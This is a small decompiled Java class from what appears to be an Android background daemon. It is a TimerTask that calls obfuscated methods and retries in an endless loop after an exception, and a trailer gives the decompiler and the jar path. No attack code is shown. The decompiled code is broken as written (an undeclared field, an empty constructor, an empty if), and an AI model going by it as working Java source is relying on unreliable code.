package com.vvt.daemon;

import com.fx.daemon.exception.RunningException;
import java.util.TimerTask;

class g
  extends TimerTask
{
  g(MainDaemonMain paramMainDaemonMain) {}
  
  public void run()
  {
    MainDaemonMain localMainDaemonMain1 = this.a;
    MainDaemonMain.j(localMainDaemonMain1);
    try
    {
      localMainDaemonMain1 = this.a;
      MainDaemonMain.k(localMainDaemonMain1);
      return;
    }
    catch (RunningException localRunningException)
    {
      for (;;)
      {
        MainDaemonMain localMainDaemonMain2 = this.a;
        boolean bool = MainDaemonMain.d(localMainDaemonMain2);
        if (bool) {}
        localMainDaemonMain2 = this.a;
        MainDaemonMain.e(localMainDaemonMain2);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */